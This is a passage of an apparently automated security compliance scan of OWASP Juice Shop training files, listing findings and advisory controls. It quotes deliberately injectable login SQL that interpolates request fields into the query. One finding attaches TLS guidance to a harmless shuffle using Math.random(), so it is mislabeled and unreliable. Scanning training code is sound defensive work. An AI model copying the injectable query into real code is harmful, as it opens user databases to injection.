{"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginJimChallenge_2.ts`
**Scanned at**: 2026-10-11T16:35:14.571000+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: f...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginJimChallenge_4.ts`
**Scanned at**: 2026-10-11T16:35:12.878042+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 18 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 18
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: t...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 18, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/app/coding-challenge-page/components/coding-challenge-fix-it/coding-challenge-fix-it.component.ts`
**Scanned at**: 2026-10-11T16:35:17.309974+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 120 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 120
.map((fix, index) => ({ fix, index, sort: Math.random() }))
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🔴 Critical | [SAST-M-006](https://verify.example-org.internal/?id=SAST-M-006) | Native Memory Safety and Unsafe Code Assurance |
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🔴 Critical | [COOK-M-001](https://verify.example-org.internal/?id=COOK-M-001) | Secure Cookie Attributes (HttpOnly, Secure, SameSite) |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 120, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/unionSqlInjectionChallenge_1.ts`
